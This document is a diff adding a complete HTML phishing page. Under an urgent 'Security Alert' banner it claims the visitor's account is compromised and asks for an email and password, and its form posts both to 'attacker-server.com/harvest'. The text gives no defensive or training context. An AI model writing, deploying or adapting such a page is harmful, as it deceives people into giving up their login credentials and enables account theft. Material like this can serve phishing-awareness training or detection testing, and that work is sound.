@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert - Verify Your Account</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        .warning { background: #ff0000; color: white; padding: 20px; }
+        input { padding: 10px; margin: 10px; width: 300px; }
+        button { padding: 10px 20px; background: #0066cc; color: white; }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h1>⚠️ Security Alert</h1>
+        <p>Your account has been compromised. Verify immediately!</p>
+    </div>
+    <form action="https://attacker-server.com/harvest" method="POST">
+        <input type="email" name="email" placeholder="Email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Verify Account</button>
+    </form>
+</body>
+</html>
